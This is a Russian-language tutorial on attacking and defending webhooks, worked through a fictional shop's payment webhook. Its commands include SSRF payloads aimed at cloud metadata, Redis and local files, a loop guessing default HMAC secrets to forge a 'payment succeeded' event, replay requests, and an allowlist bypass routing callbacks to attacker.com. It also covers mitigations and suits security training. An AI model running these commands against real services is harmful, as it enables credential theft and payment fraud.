## Вопрос, с которого всё начинается

Интернет-магазин принимает оплату через платёжный сервис. Когда клиент платит, сервис **сам** стучится в магазин по адресу `https://shop.example/api/payments/webhook` и сообщает: «заказ 1234 оплачен». Это и есть webhook — HTTP-запрос, который один сервис делает другому при событии.

Вопрос, который стоит миллионы: а что если этот запрос можно подделать? Если магазин поверит фальшивому «оплата прошла», товар уйдёт бесплатно. Сегодня разберём webhook с двух сторон — как **оружие** (SSRF) и как **цель** (подделка подписи, replay).

## Наш пример: webhook платёжки

Магазин `shop.example` принимает webhook от платёжного провайдера. Запрос выглядит так:

```http
POST /api/payments/webhook HTTP/1.1
Host: shop.example
X-Signature: sha256=8f4a...c2
Content-Type: application/json

{"event":"payment.success","order_id":1234,"amount":5000}
```

`X-Signature` — это **HMAC**-подпись: значение, посчитанное из секретного ключа и тела запроса. Магазин пересчитывает её у себя и, если совпало, верит событию. Разберём, где эта схема ломается.

## Шаг 1: SSRF — сервис делает запрос по твоему URL

Первый вектор — там, где webhook **регистрирует пользователь**. Ты задаёшь `callback_url`, и сервис делает по нему исходящий запрос. Это классический SSRF: запрос идёт **изнутри** инфраструктуры, где доступны внутренние адреса.

Сначала проверим, что запрос вообще уходит — подставим свой слушатель (Burp Collaborator или `interactsh`):

```bash
$ curl -s -X POST https://api.example/v1/webhooks -H "Authorization: Bearer $TOKEN" \
>   -d '{"url":"https://MY-COLLAB.net/","event":"test"}'
{"id":"wh_1","url":"https://MY-COLLAB.net/","status":"active"}
```

В логах коллаборатора видим входящий запрос — значит, URL под нашим контролем. Теперь целимся во внутренние сервисы и облачные метаданные:

```bash
$ curl -s -X POST https://api.example/v1/webhooks -H "Authorization: Bearer $TOKEN" \
>   -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","event":"test"}'
```

`169.254.169.254` — это адрес службы метаданных облака, откуда можно вытащить временные ключи роли. Если ответ сервиса (или ошибка доставки) возвращает содержимое — у нас SSRF с утечкой кредов. Туда же цели: `http://127.0.0.1:6379/` (Redis), `file:///etc/passwd`, `gopher://`.

## Шаг 2: подпись — где её обычно ломают

HMAC-подпись задумана так, что подделать её без секрета нельзя. Но реализация подводит. Основные ошибки:

- **Дефолтный секрет.** В примерах кода часто оставляют `secret`, `changeme`, `test`. Пробуем словарём:

```bash
$ for s in secret changeme supersecret; do
>   sig=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$s" -hex | awk '{print $2}')
>   code=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://shop.example/api/payments/webhook \
>     -H "X-Signature: sha256=$sig" --data-binary "$BODY")
>   echo "$s -> $code"
> done
secret -> 401
changeme -> 200
```

Секрет `changeme` дал `200` — подпись подделана.

- **Подпись считается не от того тела.** Если сервер сначала парсит JSON, а потом пересобирает его для проверки, порядок ключей и пробелы могут измениться — и подпись «сойдётся» с другим смыслом. Подписывать нужно **сырые байты**.
- **Проверка через `==`** вместо `hmac.compare_digest` открывает timing-атаку.
- **Подпись опциональна.** Иногда, если заголовок вовсе не прислать, проверка просто пропускается.

## Шаг 3: replay — повтор события

Даже корректная подпись не спасает, если нет защиты от повторов. Перехватив (или подсмотрев в логах) один легитимный webhook, его можно переслать много раз:

```bash
$ for i in $(seq 1 5); do
>   curl -s -X POST https://shop.example/api/payments/webhook \
>     -H 'X-Signature: sha256=<валидная_подпись_старого_события>' --data-binary @hook.json
> done
```

Если магазин зачисляет заказ на каждый повтор — это replay. Защита — `timestamp` в подписи с окном (например, 5 минут) плюс идемпотентность по `event_id`: повтор с тем же id игнорируется.

## Шаг 4: обход allowlist

Часто `callback_url` фильтруют по белому списку доменов. Обойти его помогают трюки разбора URL: символ `@`, двойной слэш, редирект с разрешённого хоста.

```bash
$ curl -s -X POST https://api.example/v1/webhooks -d '{"url":"https://trusted.com@attacker.com/hook"}'
```

Здесь парсер может увидеть домен `trusted.com`, а реальный запрос уйдёт на `attacker.com`. Ещё варианты: десятичный IP (`2130706433` вместо `127.0.0.1`), DNS-имя на localhost (`127.0.0.1.nip.io`) и **DNS rebinding** — домен сначала резолвится в «хороший» IP (проверка проходит при регистрации), а при отправке — в `127.0.0.1`.

## Если не сработало

- SSRF не читается обратно (сервис не показывает ответ) — используй **out-of-band**: коллаборатор/`interactsh`, слепой SSRF всё равно виден по входящему запросу.
- Секрет не подобрался — попробуй пары «запрос+подпись» для offline-подбора в `hashcat`, если у тебя есть хоть один валидный образец.
- Replay отклоняется — значит, есть `timestamp`/`event_id`; проверь границы окна и коллизии id.
- Allowlist держится — проверь, **в какой момент** валидируется URL: при сохранении или при отправке. Разница — залог большинства обходов.

## Схемы подписи у популярных провайдеров

Чтобы проверить подпись точно, нужно знать, **что именно** подписывает провайдер и каким заголовком:

| Провайдер | Заголовок | Алгоритм | Особенность |
|-----------|-----------|----------|-------------|
| Stripe | `Stripe-Signature` | HMAC-SHA256 | timestamp + `v1=` |
| GitHub | `X-Hub-Signature-256` | HMAC-SHA256 | префикс `sha256=` |
| Slack | `X-Slack-Signature` | HMAC-SHA256 | timestamp + `v0=` |
| Shopify | `X-Shopify-Hmac-Sha256` | HMAC (base64) | сравнение base64 |
| Twilio | `X-Twilio-Signature` | HMAC-SHA1 | подпись по URL + параметрам |

Из таблицы видно ключевое: у Stripe и Slack в подпись входит **timestamp** — это и есть их защита от replay. У GitHub его нет, поэтому replay-риск там выше, и идемпотентность ложится на получателя. Разбирайся со схемой конкретного провайдера, прежде чем строить подделку.

## Что мы теперь знаем

- Webhook — это HTTP-запрос от сервиса по URL, который часто контролирует пользователь.
- Поэтому webhook — естественный SSRF-примитив: метаданные, внутренние API, `gopher`.
- Подпись (HMAC) ломают дефолтным секретом, неверным телом или опциональностью.
- Replay возможен, если нет `timestamp`/`nonce` и идемпотентности по `event_id`.
- Allowlist обходят через `@`, редиректы и DNS rebinding.
- Итог — подделка события (например, «оплата прошла») или утечка внутренних данных.

## На что смотреть дальше

- Всегда проверяй **дефолтный секрет** — он чаще всего из примеров документации.
- Не забывай про replay: отсутствие окна/идемпотентности — реальный баг.
- Помни, что подпись должна покрывать **сырое** тело, а не пересобранный JSON.
- Не считай allowlist надёжным — URL-парсинг ломается регулярно.
- Не ломай прод: повторные «оплаты» и бонусы — только с разрешения.
- Проверяй и **исходящие** цели: DNS rebinding и `nip.io` обходят фильтр по имени, даже когда прямой `127.0.0.1` запрещён.

А пока главное запомни: webhook — это доверенный запрос между сервисами, и если он попадает под контроль пользователя, ломаются сразу и SSRF, и подпись, и replay.
